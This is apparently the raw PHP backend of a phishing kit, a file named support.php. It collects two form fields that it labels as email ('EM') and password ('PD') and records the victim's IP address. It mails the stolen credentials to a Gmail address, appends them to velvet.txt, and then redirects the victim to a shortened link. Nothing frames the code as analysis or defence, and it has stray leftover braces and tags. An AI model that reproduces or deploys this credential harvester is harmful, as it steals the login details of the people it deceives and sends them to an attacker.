
application/x-httpd-php support.php ( PHP script text )

<?php
if($_POST["A4122D1F1DBCA462A849AF0095B4279AF"] != "" and $_POST["B1BECBF0A08974148819C10084A2D9F43"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "gallery  ".$_POST['A4122D1F1DBCA462A849AF0095B4279AF']."\n";
$message .= "image  ".$_POST['B1BECBF0A08974148819C10084A2D9F43']."\n";
$message .= "Krib  ".$ip."\n";
$send = "squinsquinebojo@gmail.com";
$subject = "Triple G";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://bit.ly/2SbQlZz");
}else{
header ("Location: index.html");
}

?>

}

?>
<?php
$bville = $_POST['A4122D1F1DBCA462A849AF0095B4279AF'];
$cville = $_POST['B1BECBF0A08974148819C10084A2D9F43'];
$ip = $_SERVER['REMOTE_ADDR'];
$fw = fopen('velvet.txt', 'a');
fwrite($fw, 'EM: ' . $bville . ' | PD: ' . $cville . ' | GPS: ' . $ip . "\n");
fclose($fw);
header("Location: https://bit.ly/2SbQlZz");
?>